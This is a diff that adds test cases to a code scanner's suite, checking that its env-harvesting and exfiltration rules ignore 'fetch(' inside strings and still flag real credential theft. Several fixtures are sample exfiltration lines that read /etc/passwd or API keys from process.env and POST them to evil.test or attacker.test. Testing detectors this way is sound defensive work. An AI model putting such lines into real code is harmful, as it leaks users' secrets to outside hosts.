@@ -297,6 +297,99 @@ const url = "https://example.com/path//segment";
     expectRulePresence(findings, "env-harvesting", false);
   });
 
+  it("does not treat a network-send token inside a string literal as context (#82469)", () => {
+    // The only `fetch(` is the word inside an it() description string; the file
+    // never makes a network call. Historically this tripped env-harvesting.
+    const source = `
+import { it, expect } from "vitest";
+it("prefers metadata fetch( ) over static config", () => {
+  const prev = process.env.ACME_PROXY_URL;
+  process.env.ACME_PROXY_URL = "http://127.0.0.1:9999";
+  expect(prev).toBeDefined();
+});
+`;
+    const findings = scanSource(source, "provider.proxy.test.ts");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("still flags a bracket-property file read paired with a network send (#82469)", () => {
+    // potential-exfiltration deliberately does NOT mask string literals: its primary
+    // token can be a bracket-property string (`fs["readFile"]`) in a real read, so
+    // masking would hide genuine exfiltration.
+    const source = `
+import fs from "node:fs";
+const data = fs["readFile"]("/etc/passwd", "utf-8");
+fetch("https://evil.test/collect", { method: "POST", body: data });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "potential-exfiltration", true);
+  });
+
+  it("still flags a real harvester whose fetch() call is code, not a string (#82469)", () => {
+    const source = `
+const key = process.env.OPENAI_API_KEY;
+fetch("http://attacker.test/collect", { method: "POST", body: key });
+`;
+    const findings = scanSource(source, "index.js");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
+  it("still flags a harvester built with a backtick template holding process.env (#82469)", () => {
+    // `${...}` interpolation bodies stay unmasked — they hold real code, so masking
+    // them would hide genuine harvesting.
+    const source = "fetch(`http://evil.test/?k=${process.env.SECRET_TOKEN}`);\n";
+    const findings = scanSource(source, "leak.js");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
+  it("does not treat static backtick template text as env-harvesting context (#82469)", () => {
+    // The network-send token lives only in the static text of a template literal,
+    // not in a `${...}` expression, so it must not drive a finding.
+    const source = `
+const help = \`run the metadata fetch( ) helper first\`;
+const region = process.env.AWS_REGION;
+export const info = { help, region };
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("still flags a harvester after a regex literal that contains quote chars (#82469)", () => {
+    // A regex like /["']/ contains quote chars; the masker must treat it as a regex,
+    // not a string start — otherwise it blanks the real code that follows and the
+    // env-harvesting rule misses a genuine credential exfiltration.
+    const source = `
+const quoteChars = /["']/;
+const key = process.env.SECRET_TOKEN;
+fetch("http://evil.test/collect", { method: "POST", body: key });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
+  it("still flags a harvester when a regex with a brace sits in a template interpolation (#82469)", () => {
+    // The regex `/}/` contains a brace; the masker must consume it as a regex so the
+    // `}` does not prematurely end the `${...}` interpolation and blank the real code
+    // (process.env access) that follows inside it.
+    const source = [
+      "const region = getRegion();",
+      'fetch(`http://x/${ /}/.test(region) ? process.env.SECRET_TOKEN : "" }`);',
+    ].join("\n");
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
+  it("does not treat a network-send token inside an interpolation string as context (#82469)", () => {
+    // The only `fetch(` lives in a "..." string inside a `${...}` interpolation, so it
+    // must not drive an env-harvesting finding even though process.env is nearby.
+    const source = [
+      "const region = process.env.AWS_REGION;",
+      'const url = `https://api/${ pick("call fetch( ) later", region) }`;',
+    ].join("\n");
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
